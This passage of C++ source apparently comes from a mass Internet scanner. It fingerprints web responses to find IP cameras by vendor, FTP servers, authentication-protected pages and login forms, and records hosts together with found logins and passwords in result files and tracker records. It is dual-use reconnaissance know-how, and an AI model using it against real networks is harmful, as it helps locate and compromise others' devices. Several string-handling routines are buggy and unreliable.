﻿#pragma once
#include "STh.h"
#include "resource.h"	

char* __cdecl strstri(char *_Str, const char *_SubStr)
{
	if(_Str != NULL)
	{
		string _lowStr = toLowerStr(_Str);
		string _lowSubStr = toLowerStr(_SubStr);
		const char *resChar = strstr(_lowStr.c_str(), _lowSubStr.c_str());
		int offset = resChar - _lowStr.c_str();
		if(offset < 0) return NULL;
		else return (char*)(_Str + offset);
	};
};

bool gGlobalTrackLocked = false;
char *FindFirstOcc(char *str, char *delim)
{
	int sz = strlen(str);
	int dsz = strlen(delim);
	for(int i = 0; i < sz; ++i)
	{
		for(int j = 0; j < dsz; ++j)
		{
			if(str[i] == delim[j]) return (char *)(str + i);
		};
	};

	return str;
};
char *FindLastOcc(char *str, char *delim)
{
	int sz = strlen(str);
	int dsz = strlen(delim);
	int savedPosition = 0;
	for(int i = 0; i < sz; ++i)
	{
		for(int j = 0; j < dsz; ++j)
		{
			if(str[i] == delim[j]) savedPosition = i;
		};
	};

	return (char *)(str + savedPosition);
};
char *GetCodePage(char *str)
{
	char cdpg[32] = {0};
	if(strstri(str, "<meta ") != NULL)
	{
		char *temp2 = strstri(str, "<meta ");

		if(strstri((char *)(temp2 + strlen("<meta ")), "charset=") != NULL)
		{
			char *temp3 = strstri((char *)(temp2 + strlen("<meta ")), "charset=");
			char *temp4 = FindFirstOcc((char *)(temp3 + strlen("charset=")), " \"'\n\r");
			int ln = (int)(temp4 - temp3 - strlen("charset="));
			if(ln > 16) 
			{
				return "WTF?";
			};
			strncpy(cdpg, (char *)(temp3 + strlen("charset=")), (ln > 32) ? 32 : ln );
			if(strstri(cdpg, "%s") != NULL) return "UTF-8";
			return cdpg;
		}
		else if(strstri((char *)(temp2 + strlen("<meta ")), "charset = ") != NULL)
		{
			char *temp3 = strstri((char *)(temp2 + strlen("<meta ")), "charset = ");
			char *temp4 = FindFirstOcc((char *)(temp3 + strlen("charset = ")), " \"'\n\r");
			int ln = (int)(temp4 - temp3 - strlen("charset = "));
			if(ln > 16) 
			{
				return "WTF?";
			};
			strncpy(cdpg, (char *)(temp3 + strlen("charset = ")), (ln > 32) ? 32 : ln );
			if(strstri(cdpg, "%s") != NULL) return "UTF-8";
			return cdpg;
		}
		else if(strstri((char *)(temp2 + strlen("<meta ")), "charset =") != NULL)
		{
			char *temp3 = strstri((char *)(temp2 + strlen("<meta ")), "charset =");
			char *temp4 = FindFirstOcc((char *)(temp3 + strlen("charset =")), " \"'\n\r");
			int ln = (int)(temp4 - temp3 - strlen("charset ="));
			if(ln > 16) 
			{
				return "WTF?";
			};
			strncpy(cdpg, (char *)(temp3 + strlen("charset =")), (ln > 32) ? 32 : ln );
			if(strstri(cdpg, "%s") != NULL) return "UTF-8";
			return cdpg;
		}
		else
		{
			if(strstri(str, "charset=") != NULL)
			{
				char *temp2 = strstri(str, "charset=");
				char *temp3 = FindFirstOcc((char *)(temp2 + strlen("charset=")), " \"'\n\r");
				int ln = (int)(temp3 - temp2 - strlen("charset="));
				if(ln > 16) 
				{
					return "WTF?";
				};
				strncpy(cdpg, (char *)(temp2 + strlen("charset=")), (ln > 32) ? 32 : ln );
				if(strstri(cdpg, "%s") != NULL) return "UTF-8";
				return cdpg;	
			}
			else
			{
				return "NULL";
			};
		};	
	}
	else if(strstri(str, "charset=") != NULL)
	{
		char *temp2 = strstri(str, "charset=");
		char *temp3 = FindFirstOcc((char *)(temp2 + strlen("charset=")), " \"'\n\r");
		int ln = (int)(temp3 - temp2 - strlen("charset="));
		if(ln > 16) 
		{
			return "WTF?";
		};
		strncpy(cdpg, (char *)(temp2 + strlen("charset=")), (ln > 32) ? 32 : ln );
		if(strstri(cdpg, "%s") != NULL) return "UTF-8";
		return cdpg;	
	}
	else
	{
		return "NULL";
	};
};
int Lexems::globalSearchNeg(const char *buffcp, char *ip)
{
	if(strlen(buffcp) == 0) return -1;
		
	char buffcpy[RECV_MAX_LENGTH] = {0};
	std::string rr = toLowerStr(xcode(buffcp, CP_UTF8, CP_ACP).c_str());

	memcpy((void*)buffcpy, rr.c_str(), rr.size());

	char negWord[256] = {0};
	for(int i = 0; i < GlobalNegativeSize; i++)
	{
		if(globalScanFlag)
		{
			strcpy(negWord, GlobalNegatives[i]);
			if(strstr(buffcpy, negWord) != NULL && (strcmp(negWord, "") != 0 || strlen(negWord) >= 2)) 
			{
				if(gNegDebugMode)
				{
					stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + "\"><font color=\"#0084ff\">" + QString(ip) + "</font></a>" + "] Negative hit: \"" + QString::fromLocal8Bit(negWord).toHtmlEscaped() + "\"");
					if(strlen(negWord) < 2) 
					{
						stt->doEmitionDebugFoundData("		Len:" + QString::number(strlen(negWord)));
					};
					if(strcmp(negWord, "") == 0) 
					{
						stt->doEmitionDebugFoundData("Empty hit!");
					};
					if(strcmp(negWord, " ") == 0) 
					{
						stt->doEmitionDebugFoundData("Space hit!");
					};
				};
				++Filt;
				return -1;
			};
		};
		ZeroMemory(negWord, 256);
	};
	return 0;
};
int globalSearchPrnt(char *buffcp)
{
	char buffcpy[RECV_MAX_LENGTH] = {0};
	strcpy(buffcpy, toLowerStr(buffcp).c_str());

	if(strstr(buffcpy, "en/_top.htm") != NULL || strstr(buffcpy, "cannon http server") != NULL
		|| strstr(buffcpy, "konica minolta") != NULL || strstr(buffcpy, "/eng/home_frm.htm") != NULL
		|| strstr(buffcpy, "networkScanner webserver") != NULL || strstr(buffcpy, "/eng/htm/top.htm") != NULL
		|| strstr(buffcpy, "canon http server") != NULL || strstr(buffcpy, "pages/t_ixdmy.htm") != NULL
		|| strstr(buffcpy, "/web/guest/") != NULL || strstr(buffcpy, "printerInfo") != NULL
		|| strstr(buffcpy, "hp Photosmart") != NULL || strstr(buffcpy, "hp laserjet") != NULL
		|| strstr(buffcpy, "menu and info frames") != NULL || strstr(buffcpy, "hp color laserjet") != NULL
		|| strstr(buffcpy, "menu and content fFrames") != NULL || strstr(buffcpy, "hewlett packard") != NULL
		|| strstr(buffcpy, "menu and info frames") != NULL
		|| strstr(buffcpy, "laserjet") != NULL || strstr(buffcpy, "supplies summary") != NULL
		|| strstr(buffcpy, "seiko epson") != NULL || strstr(buffcpy, "ink_y.png") != NULL
		|| strstr(buffcpy, "EpsonNet") != NULL || strstr(buffcpy, "printer name") != NULL
		) 
		{
			if(gNegDebugMode)
			{
				stt->doEmitionDebugFoundData("Printer detected.");		
			};
			return -1;
	};
};

// 500 < 1600
int _mainFinderFirst(char *buffcp, int f, int port, char *ip)
{
	Lexems l;
	char buffcpy[RECV_MAX_LENGTH] = {0};
	strcpy(buffcpy, toLowerStr(buffcp).c_str());

	if((strstr(buffcpy, "401 authorization") != NULL || strstr(buffcpy, "401 unauthorized") != NULL || (strstr(buffcpy, "www-authenticate") != NULL && strstr(buffcpy, "401 ") != NULL )
		|| strstr(buffcpy, "401 unauthorized access denied") != NULL || strstr(buffcpy, "401 unauthorised") != NULL || (strstr(buffcpy, "www-authenticate") != NULL && strstr(buffcpy, " 401\r\n") != NULL)
		)
		&& strstr(buffcpy, "digest realm") != NULL) return 101;
	if(strstr(buffcpy, "401 authorization") != NULL || strstr(buffcpy, "401 unauthorized") != NULL || (strstr(buffcpy, "www-authenticate") != NULL && strstr(buffcpy, "401 ") != NULL )
		|| strstr(buffcpy, "401 unauthorized access denied") != NULL || strstr(buffcpy, "401 unauthorised") != NULL || (strstr(buffcpy, "www-authenticate") != NULL && strstr(buffcpy, " 401\r\n") != NULL)
		) return 1;
	if(strstr(buffcpy, "bad request (invalid hostname)") != NULL || strstr(buffcpy, "bad request - invalid hostname") != NULL
		||strstr(buffcpy, "http error 400.") != NULL) return -1;
	if(strstr(buffcpy, "501 not implemented") != NULL
		|| strstr(buffcpy, "403 forbidden") != NULL || strstr(buffcpy, "504 gateway timeout") != NULL
		|| strstr(buffcpy, "500 internal server error") != NULL || strstr(buffcpy, "502 bad gateway") != NULL
		) return -1;
	if(strstr(buffcpy, "netwave ip camera")) return 11;
	if(strstr(buffcpy, "live view / - axis")) return 12;
	if(strstr(buffcpy, "vilar ipcamera")) return 13;
	if(strstr(buffcpy, "window.location = \"rdr.cgi\"")) return 14;
	if(strstr(buffcpy, "httpfileserver")) return 15;
	if(strstr(buffcpy, "real-time ip camera monitoring system") != NULL ||
		strstr(buffcpy, "server push mode") != NULL
		) return 17; //Real-time IP Camera Monitoring System
	if(strstr(buffcpy, "linksys.com") != NULL && strstr(buffcpy, "tm05") != NULL) return 18; //linksys.com cameras
	if(strstr(buffcpy, "reecam ip camera") != NULL) return 19; //reecam cameras
	if(strstr(buffcpy, "bridge eyeon") != NULL) return 21; //Bridge Eyeon
	if(strstr(buffcpy, "ip camera control webpage") != NULL && strstr(buffcpy, "/main/cs_motion.asp") != NULL) return 22; //ip camera control
	if(strstr(buffcpy, "network camera") != NULL && strstr(buffcpy, "/live/index2.html") != NULL) return 23; //network camera BB-SC384
	if(strstr(buffcpy, "network camera") != NULL && strstr(buffcpy, "/viewer/live/en/live.html") != NULL) return 24; //Network Camera VB-M40
	
	if(strstr(buffcpy, "panasonic ") != NULL && strstr(buffcpy, ":60002/snapshotjpeg") != NULL) return 25; //Panasonic wtfidonteven-camera
	if(strstr(buffcpy, "sony network camera") != NULL && strstr(buffcpy, "/command/inquiry.cgi?") != NULL) return 26; //Sony Network Camera
	if(strstr(buffcpy, "network camera") != NULL && strstr(buffcpy, "src=\"webs.cgi?") != NULL) return 27; //UA Network Camera
	if(strstr(buffcpy, "network camera") != NULL && strstr(buffcpy, "/viewer/live/index.html") != NULL) return 28; //Network Camera VB-M40
	if(strstr(buffcpy, "lg smart ip device") != NULL) return 29; //LG Smart IP Device Camera
	if(strstr(buffcpy, "/view/viewer_index.shtml") != NULL) return 20; //axis cameras
	if(strstr(buffcpy, "nas") != NULL && strstr(buffcpy, "/cgi-bin/data/viostor-220/viostor/viostor.cgi") != NULL) return 30; //NAX
	if(strstr(buffcpy, "ip camera") != NULL && strstr(buffcpy, "check_user.cgi") != NULL) return 31; //ip cams
	if(strstr(buffcpy, "ws(\"user\");") != NULL && strstr(buffcpy, "src=\"/tool.js") != NULL && strstr(buffcpy, "<b class=\"xb1\"></b>") != NULL) return 32; //IPC web ip cam
	if(strstr(buffcpy, "geovision") != NULL && strstr(buffcpy, "ip camera") != NULL) return 33; //GEO web ip cam

	if(((strstr(buffcpy, "220") != NULL) && (port == 21)) || 
		(strstri(buffcpy, "220 diskStation ftp server ready") != NULL) ||
		(strstri(buffcpy, "220 ftp server ready") != NULL)
		|| strstr(buffcpy, "500 'get': command not understood") != NULL
		) return 16; // 16 - FTP
	
	if(strstr(buffcpy, "<form ") != NULL && strstr(buffcpy, "302 found") == NULL)
	{
		if(l.globalSearchNeg(buffcp, ip) == -1) return -1;
		if(globalSearchPrnt(buffcp) == -1) return -1;
		return 10;
	};

	if(strstr(buffcpy, "camera web server") != NULL		|| strstr(buffcpy, "webcamxp 5") != NULL
		|| strstr(buffcpy, "ip box camera") != NULL		|| strstr(buffcpy, "snaff") != NULL
		|| strstr(buffcpy, "hfs /") != NULL				|| strstr(buffcpy, "httpfileserver") != NULL
		|| strstr(buffcpy, "vilar ipcamera") != NULL	|| strstr(buffcpy, "network camera server") != NULL
		|| strstr(buffcpy, "ipcamera") != NULL			|| strstr(buffcpy, "$lock extended") != NULL
		|| strstr(buffcpy, "ip camera") != NULL			|| strstr(buffcpy, "network ip camera") != NULL
		|| strstr(buffcpy, "ipcam_language") != NULL
		|| strstr(buffcpy, "/viewer/video.jpg") != NULL || strstr(buffcpy, "smart ip device") != NULL
		|| strstr(buffcpy, "sanpshot_icon") != NULL		|| strstr(buffcpy, "snapshot_icon") != NULL
		) return 0;
	if(l.globalSearchNeg(buffcp, ip) == -1) return -1;
	if(globalSearchPrnt(buffcp) == -1) return -1;

	if(strlen(buffcpy) <= 160 && port != 21)
	{
		if(gNegDebugMode)
		{
			stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Ignoring: Size &lt; 160 bytes.");
		};
		return -1;
	}
	else if(strlen(buffcpy) < 500) 
	{
		if(f) return 7;
	};

	if(strstr(buffcpy, "function.require") != NULL || strstr(buffcpy, "failed to open stream") != NULL ||
		strstr(buffcpy, "include_path=") != NULL
		) return 3;
	
	return 0;
};
//> 1600
int _mainFinderSecond(char *buffcp, int port, char *ip)
{
	Lexems l;
	char buffcpy[RECV_MAX_LENGTH] = {0};
	strcpy(buffcpy, toLowerStr(buffcp).c_str());
	if((strstr(buffcpy, "401 authorization") != NULL || strstr(buffcpy, "401 unauthorized") != NULL || (strstr(buffcpy, "www-authenticate") != NULL && strstr(buffcpy, "401 ") != NULL )
		|| strstr(buffcpy, "401 unauthorized access denied") != NULL || strstr(buffcpy, "401 unauthorised") != NULL || (strstr(buffcpy, "www-authenticate") != NULL && strstr(buffcpy, " 401\r\n") != NULL)
		)
		&& strstr(buffcpy, "digest realm") != NULL) return 101;
	if(strstr(buffcpy, "401 authorization") != NULL || strstr(buffcpy, "401 unauthorized") != NULL || (strstr(buffcpy, "www-authenticate") != NULL && strstr(buffcpy, "401 ") != NULL )
		|| strstr(buffcpy, "401 unauthorized access denied") != NULL || strstr(buffcpy, "401 unauthorised") != NULL || (strstr(buffcpy, "www-authenticate") != NULL && strstr(buffcpy, " 401\r\n") != NULL)
		) return 1;
	if(strstr(buffcpy, "bad request (invalid hostname)") != NULL || strstr(buffcpy, "bad request - invalid hostname") != NULL
		||strstr(buffcpy, "http error 400.") != NULL) return -1;
	if(strstr(buffcpy, "501 not implemented") != NULL
		|| strstr(buffcpy, "403 forbidden") != NULL || strstr(buffcpy, "504 gateway timeout") != NULL
		|| strstr(buffcpy, "500 internal server error") != NULL || strstr(buffcpy, "502 bad gateway") != NULL
		) return -1;
	if(strstr(buffcpy, "netwave ip camera")) return 11;
	if(strstr(buffcpy, "live view / - axis")) return 12;
	if(strstr(buffcpy, "vilar ipcamera")) return 13;
	if(strstr(buffcpy, "window.location = \"rdr.cgi\"")) return 14;
	if(strstr(buffcpy, "httpfileserver")) return 15;
	if(strstr(buffcpy, "real-time ip camera monitoring system") != NULL ||
		strstr(buffcpy, "server push mode") != NULL
		) return 17; //Real-time IP Camera Monitoring System
	if(strstr(buffcpy, "linksys.com") != NULL && strstr(buffcpy, "tm05") != NULL) return 18; //linksys.com cameras
	if(strstr(buffcpy, "reecam ip camera") != NULL) return 19; //reecam cameras
	if(strstr(buffcpy, "bridge eyeon") != NULL) return 21; //Bridge Eyeon
	if(strstr(buffcpy, "ip camera control webpage") != NULL && strstr(buffcpy, "/main/cs_motion.asp") != NULL) return 22; //ip camera control
	if(strstr(buffcpy, "network camera") != NULL && strstr(buffcpy, "/live/index2.html") != NULL) return 23; //network camera BB-SC384
	if(strstr(buffcpy, "network camera") != NULL && strstr(buffcpy, "/viewer/live/en/live.html") != NULL) return 24; //Network Camera VB-M40
	if(strstr(buffcpy, "panasonic ") != NULL && strstr(buffcpy, ":60002/snapshotjpeg") != NULL) return 25; //Panasonic wtfidonteven-camera
	if(strstr(buffcpy, "sony network camera") != NULL && strstr(buffcpy, "/command/inquiry.cgi?") != NULL) return 26; //Sony Network Camera
	if(strstr(buffcpy, "network camera") != NULL && strstr(buffcpy, "src=\"webs.cgi?") != NULL) return 27; //UA Network Camera
	if(strstr(buffcpy, "network camera") != NULL && strstr(buffcpy, "/viewer/live/index.html") != NULL) return 28; //Network Camera VB-M40
	if(strstr(buffcpy, "lg smart ip device") != NULL) return 29; //LG Smart IP Device Camera
	if(strstr(buffcpy, "/view/viewer_index.shtml") != NULL) return 20; //axis cameras
	if(strstr(buffcpy, "nas") != NULL && strstr(buffcpy, "/cgi-bin/data/viostor-220/viostor/viostor.cgi") != NULL) return 30; //NAX
	if(strstr(buffcpy, "ip camera") != NULL && strstr(buffcpy, "check_user.cgi") != NULL) return 31; //axis cameras
	if(strstr(buffcpy, "ws(\"user\");") != NULL && strstr(buffcpy, "src=\"/tool.js") != NULL && strstr(buffcpy, "<b class=\"xb1\"></b>") != NULL) return 32; //web ip cam
	if(strstr(buffcpy, "geovision") != NULL && strstr(buffcpy, "ip camera") != NULL) return 33; //GEO web ip cam

	if(((strstr(buffcpy, "220") != NULL) && (port == 21)) || 
		(strstr(buffcpy, "220 diskStation ftp server ready") != NULL) ||
		(strstr(buffcpy, "220 ftp server ready") != NULL)
		|| strstr(buffcpy, "500 'get': command not understood") != NULL
		) return 16; // 16 - FTP

	if(strstr(buffcpy, "<form ") != NULL && strstr(buffcpy, "302 found") == NULL) 
	{
		if(l.globalSearchNeg(buffcp, ip) == -1) return -1;
		if(globalSearchPrnt(buffcp) == -1) return -1;
		return 10;
	};

	if(strstr(buffcpy, "camera web server") != NULL		|| strstr(buffcpy, "webcamxp 5") != NULL
		|| strstr(buffcpy, "ip box camera") != NULL		|| strstr(buffcpy, "snaff") != NULL
		|| strstr(buffcpy, "hfs /") != NULL				|| strstr(buffcpy, "httpfileserver") != NULL
		|| strstr(buffcpy, "vilar ipcamera") != NULL	|| strstr(buffcpy, "network camera server") != NULL
		|| strstr(buffcpy, "ipcamera") != NULL			|| strstr(buffcpy, "$lock extended") != NULL
		|| strstr(buffcpy, "ip camera") != NULL			|| strstr(buffcpy, "network ip camera") != NULL
		|| strstr(buffcpy, "ipcam_language") != NULL
		|| strstr(buffcpy, "/viewer/video.jpg") != NULL || strstr(buffcpy, "smart ip device") != NULL
		|| strstr(buffcpy, "sanpshot_icon") != NULL		|| strstr(buffcpy, "snapshot_icon") != NULL
		) return 0;
	
	if(l.globalSearchNeg(buffcp, ip) == -1) return -1;
	if(globalSearchPrnt(buffcp) == -1) return -1;
	

	return 3; //Suspicious
};

int ContentFilter(char *buff, int port, char *ip)
{
	if(buff != NULL)
	{
		int sz = strlen(buff);
		if(sz <= 500)
		{
			return _mainFinderFirst(buff, 1, port, ip);
		}
		else if((sz > 500 && sz <= 3500) || sz > 180000) 
		{	
			return _mainFinderFirst(buff, 0, port, ip);
		}
		else if(sz > 3500 && sz <= 180000)
		{
			return _mainFinderSecond(buff, port, ip);
		};
	}
	else return -1;
};
void fillGlobalLogData(char *ip, char *hostname, char *port, const char *sz, char *title, char *login, char *pass, char *comment, char *cdpg, char *clss)
{
	if(trackerOK == true)
	{
		while(gGlobalTrackLocked == true) Sleep(10);
		gGlobalTrackLocked = true;
		
		QJsonObject jsonData; 

			if(gMode == 0 || gMode == -1)
			{
				if(strlen(ip) > 0) jsonData.insert("ip_addr", QJsonValue(QString(ip)) );
				else jsonData.insert("ip_addr", QJsonValue(QString("")) );

				jsonData.insert("hostname", QJsonValue(QString(hostname)) );
			}
			else
			{
				jsonData.insert("ip_addr", QJsonValue(QString("")) );
				jsonData.insert("hostname", QJsonValue(QString(ip)) );
			};

			jsonData.insert("port", QJsonValue(QString(port).replace(":", "")) );
			jsonData.insert("recv", QJsonValue(QString(sz)) );
			QString tt = QString(base64_encode((const unsigned char *)title, strlen(title)).c_str());
			if(strlen(title) == 0) jsonData.insert("title", QJsonValue(QString("NULL")) );
			else jsonData.insert("title", QJsonValue(QString(base64_encode((const unsigned char *)title, strlen(title)).c_str())) );
			if(strlen(login) > 0) jsonData.insert("login", QJsonValue(QString(login)) );
			else jsonData.insert("login", QJsonValue(QString("")) );
			if(strlen(pass) > 0) jsonData.insert("pass", QJsonValue(QString(pass)) );
			else jsonData.insert("pass", QJsonValue(QString("")) );
			if(strlen(comment) > 0) jsonData.insert("other", QJsonValue(QString(comment)) );
			else jsonData.insert("other", QJsonValue(QString("")) );
			if(strlen(cdpg) > 0) jsonData.insert("encoding", QJsonValue(QString(cdpg)) );
			else jsonData.insert("encoding", QJsonValue(QString("")) );
			if(strlen(clss) > 0) jsonData.insert("Class", QJsonValue(QString(clss)) );
			else jsonData.insert("Class", QJsonValue(QString("")) );

		while(jsonArr == NULL);
		jsonArr->push_front(jsonData);

		gGlobalTrackLocked = false;
	};
};
int __checkFileExistence(int flag)
{
	char fileName[64] = {0};

	if(flag == 666 || flag == 350) strcpy(fileName, "./result_files/STRANGE_ERROR.html");
	else if(flag == -22) strcpy(fileName, "./result_files/ssh.html");
	else if(flag == 0 || flag == 15 || flag == -10) strcpy(fileName, "./result_files/strange.html");
	else if(flag == 3) strcpy(fileName, "./result_files/other.html");
	else if(flag == 7) strcpy(fileName, "./result_files/low_loads.html");
	else if(flag == 10) strcpy(fileName, "./result_files/Login_forms.html");
	else if(flag == 16) strcpy(fileName, "./result_files/FTP.html");
	else if(flag >= 17 || flag == 11 || flag == 12 
		|| flag == 13 || flag == 14 || flag == 1) strcpy(fileName, "./result_files/Basicauth.html");

	FILE *f = fopen(fileName, "r");
	if(f == NULL) return true;
	else 
	{
		fclose(f);
		return false;
	};
};

bool ftsAnom = true;
bool ftsOther = true;
bool ftsSSH = true;
bool ftsLL = true;
bool ftsFTP = true;
bool ftsBA = true;
bool ftsLF = true;

bool fOpened = false;
char styleBuff[1024] = {"<style> body { background-color: #141414; font-family: monospace; font-size:95%;} #ipd{background:black;width:100%;white-space:nowrap;overflow-x:none;display:inline-block;}#ipd:hover{color: #909090;background:#202020;}#tit{text-align:center;border:1px solid #5d5d5d;}a{color: gray;text-decoration: underline;} a:focus{ outline-style: dashed;outline-width:1px; outline-color: red;}</style>"};
char topBuff[1024] = {"<div id=\"tit\"><a href=\"strange.html\">.strange</a> <a href=\"other.html\">.other</a> <a href=\"Basicauth.html\">.BasicAuth</a> <a href=\"FTP.html\">.FTP</a>  <a href=\"low_loads.html\">.LowLoads</a> <a href=\"LoginForms.html\">.loginforms</a> <a href=\"SSH.html\">.SSH</a></div><br><br>"};
void fputsf(char *ip, char *port, char *text, int flag, char *msg)
{
	FILE *file = NULL;
	bool firstTimeYeah = false;
		
#pragma region FileExistenceCheck
	if(flag == 0 || flag == 15 || flag == -10) 
	{
		if(ftsAnom) ftsAnom				= __checkFileExistence(flag);
		file = fopen("./result_files/strange.html", "a");
	}
	else if(flag == 3) 
	{
		if(ftsOther) ftsOther			= __checkFileExistence(flag);
		file = fopen("./result_files/other.html", "a");
	}
	else if(flag == -22) 
	{
		if(ftsSSH) ftsSSH				= __checkFileExistence(flag);
		file = fopen("./result_files/SSH.html", "a");
	}
	else if(flag == 7) 
	{
		if(ftsLL) ftsLL					= __checkFileExistence(flag);
		file = fopen("./result_files/low_loads.html", "a");
	}
	else if(flag == 10) 
	{
		if(ftsLF) ftsLF					= __checkFileExistence(flag);
		file = fopen("./result_files/Login_forms.html", "a");
	}
	else if(flag == 16) 
	{
		if(ftsFTP) ftsFTP				= __checkFileExistence(flag);
		file = fopen("./result_files/FTP.html", "a");
	}
	else if(flag >= 17 || flag == 11 || flag == 12 
		|| flag == 13 || flag == 14 || flag == 1
		) 
	{
		if(ftsBA) ftsBA					= __checkFileExistence(flag);
		file = fopen("./result_files/Basicauth.html", "a");
	}
	else
	{
		stt->doEmitionRedFoundData("[WUT!?] Unknown flag [FLAG: " + QString::number(flag) + "]");	
	};
#pragma endregion
	if(file != NULL)
	{
		++saved;
		char *string = new char[strlen(text) + 512];
		if(flag != -22) 
		{
			strcpy (string, "<div id=\"ipd\" style=\"color:#707070;text-decoration: none;\">");
			time_t rtime;
			time(&rtime);
			char cdate[32] = {0};
			strcat (cdate, "[");
			strcat (cdate, ctime (&rtime));
			memset (cdate + strlen(cdate) - 1, '\0', 1);
			strcat (cdate, "] ");
			strcat (string, cdate);
			strcat (string, text);
			strcat (string, "</div>");
		}
		else
		{
			strcpy (string, "<div id=\"ipd\" style=\"color:#707070;\">");
			time_t rtime;
			time(&rtime);
			char cdate[32] = {0};
			strcat (cdate, "[");
			strcat (cdate, ctime (&rtime));
			memset (cdate + strlen(cdate) - 1, '\0', 1);
			strcat (cdate, "] ");
			strcat (string, cdate);
			strcat (string, text);
			strcat (string, "</div>");
		};

#pragma region styleFiller
		if(flag == 0 && ftsAnom)
		{
			char tmsg[1024] = {0};
			ftsAnom = false;
			strcpy(tmsg, "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /><title>Anomalies</title>");
			strcat(tmsg, msg);
			strcat(tmsg, styleBuff);
			fputs (tmsg, file);
			fputs ("<div id=\"tit\"><a href=\"strange.html\">.strange</a> <a href=\"other.html\">.other</a> <a href=\"Basicauth.html\">.BasicAuth</a> <a href=\"FTP.html\">.FTP</a>  <a href=\"low_loads.html\">.LowLoads</a> <a href=\"LoginForms.html\">.loginforms</a> <a href=\"SSH.html\">.SSH</a></div><br><br>", file);		
		};
		if(flag == 3 && ftsOther)	
		{
			char tmsg[1024] = {0};
			ftsOther = false;
			strcpy(tmsg, "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /><title>Suspicious</title>");
			strcat(tmsg, msg);
			strcat(tmsg, styleBuff);
			fputs (tmsg, file);
			fputs (topBuff, file);		
		};
		if(flag == -22 && ftsSSH)	
		{
			char tmsg[1024] = {0};
			ftsOther = false;
			strcpy(tmsg, "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /><title>SSH</title>");
			strcat(tmsg, msg);
			strcat(tmsg, styleBuff);
			fputs (tmsg, file);
			fputs (topBuff, file);		
		};
		if(flag == 7 && ftsLL)
		{
			char tmsg[1024] = {0};
			ftsLL = false;
			strcpy(tmsg, "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /><title>Lowloads</title>");
			strcat(tmsg, msg);
			strcat(tmsg, styleBuff);
			fputs (tmsg, file);
			fputs (topBuff, file);
		};
		if(flag == 16 && ftsFTP)
		{
			char tmsg[1024] = {0};
			ftsFTP = false;
			strcpy(tmsg, "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /><title>FTP</title>");
			strcat(tmsg, msg);
			strcat(tmsg, styleBuff);
			fputs (tmsg, file);
			fputs (topBuff, file);
		};
		if(flag == 10 && ftsLF)
		{
			char tmsg[1024] = {0};
			ftsLF = false;
			strcpy(tmsg, "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /><title>LoginsForms</title>");
			strcat(tmsg, msg);
			strcat(tmsg, styleBuff);
			fputs (tmsg, file);
			fputs (topBuff, file);
		
		};
		if((flag >= 17 || flag == 11 || flag == 12 || flag == 13 || flag == 14 || flag == 1) && ftsBA) 
		{
			char tmsg[1024] = {0};
			ftsBA = false;
			strcpy(tmsg, "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /><title>BasicAuth</title>");
			strcat(tmsg, msg);
			strcat(tmsg, styleBuff);
			fputs (tmsg, file);
			fputs (topBuff, file);
		};
 
#pragma endregion
		int innerCounter = 0;
		while(fOpened) 
		{
			if(innerCounter > 20)
			{
				stt->doEmitionRedFoundData("Write file loop detected!");
				break;
			};
			++innerCounter;
			Sleep((rand() % 300 + 60));
		};
		fOpened = true;
		fputs (string, file);
		fclose (file);
		fOpened = false;

		delete []string;
	}
	else
	{
#pragma region QTGUI_Area
		stt->doEmitionRedFoundData("Cannot open file [FLAG: " + QString::number(flag) + "]");
#pragma endregion
	};
};
void putInFile(int flag, char *ip, char *port, int recd, char *finalstr, char *hl, char *cp)
{
	char log[4096] = {0}, msg[512] = {0};
		
	if(flag == 0 || flag == 15 || flag == -10) strcpy(msg, "Anomaly - ");
	else if(flag == 3) strcpy(msg, "Suspicious - ");
	else if(flag == 9) strcpy(msg, "Timeout - ");
	else if(flag == 7) strcpy(msg, "Low Load - ");
	else if(flag == 8) strcpy(msg, "Forbidden - ");
	else if(flag == 6) strcpy(msg, "Not Found - ");
	else if(flag == 5 && mode != 1) strcpy(msg, "Bad Address - ");
	else if(flag == 4) strcpy(msg, "Bad Request - ");
	else if(flag == 2) strcpy(msg, "Printer  - ");
	else if(flag == 666 || flag == 350) strcpy(msg, "Strange Error - ");
	else if(flag == 10) strcpy(msg, "Login form - ");

	QTextCodec *codec;
	strcat(msg, "<a href=\"http://");
	strcat(msg, ip);
	strcat(msg, ":");
	strcat(msg, port);
	strcat(msg, "/\"><span style=\"color: #a1a1a1;\">");
	strcat(msg, ip);
	strcat(msg, ":");
	strcat(msg, port);
	strcat(msg, "</span></a>");

	QString resMes(msg);
	QString strf;
	if(strstri(cp, "shift_jis"))
	{
		codec = QTextCodec::codecForName("Shift-JIS");
		strf = codec->toUnicode(finalstr);
	}
	else if(strstri(cp, "utf"))
	{
		codec = QTextCodec::codecForName("UTF-8");
		strf = codec->toUnicode(finalstr);
	}
	else if(strstri(cp, "cp"))
	{
		codec = QTextCodec::codecForName("Windows-1251");
		strf = codec->toUnicode(finalstr);
	}
	else strf = QString(finalstr);
	if(flag != 6 && flag != 5 && flag != 4 && flag != 666 && flag != 350)
	{
		strcat(msg, " <font color=\"#0084ff\">Title: </font><font color=\"#ff9600\">");
		int sz = strf.size();
		strncat(msg, QString::fromLocal8Bit(finalstr).toHtmlEscaped().toLocal8Bit().data(), (sz < 128 ? sz : 128));
		strcat(msg, "</font>");
		resMes += " <font color=\"#0084ff\">Title: </font><font color=\"#ff9600\">" + QString(finalstr).toHtmlEscaped() + "</font>";
	};
#pragma region QTGUI_Area
	stt->doEmitionFoundData(resMes);
#pragma endregion


	strcpy(log, "<font color=GreenYellow>");	
	strcat(log, hl);
	strcat(log, "</font>");
	int flr = 40 - strlen(hl);
	if(flr > 0) 
	{
		while(flr != 0)
		{
			strcat(log, " ");
			--flr;
		};
	}
	else strcat(log, " ");
	strcat(log, "<a href=\"http://");
	strcat(log, ip);
	strcat(log, ":");
	strcat(log, port);
	strcat(log, "\"><font color=MediumSeaGreen>");
	strcat(log, ip);
	strcat(log, ":");
	strcat(log, port);
